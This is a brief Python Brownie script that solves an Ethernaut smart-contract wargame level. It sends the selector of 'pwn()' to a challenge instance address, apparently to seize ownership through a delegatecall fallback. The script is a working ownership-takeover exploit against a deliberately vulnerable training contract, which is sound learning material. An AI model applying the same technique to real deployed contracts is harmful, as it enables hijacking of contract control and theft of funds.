from scripts.helpful_scripts import get_account
from brownie import web3

# PLAYER address is "0xF8f8269488f73fab3935555FCDdD6035699deE25"

ETHERNAUT_INSTANCE = "0x58817cF27F77243817097b1297D79Ba4d850b233"


def main():

    player = get_account()

    # tx is assigned the function selector for function pwn()
    # which is the the first 4 bytes of the keccak256 hash of "pwn()"
    tx = web3.keccak(text="pwn()")[0:4]
    print(tx)

    # transfer function selector for pwn() to the ETHERNAUT_INSTANCE
    player.transfer(to=ETHERNAUT_INSTANCE, data=web3.keccak(text="pwn()")[0:4])
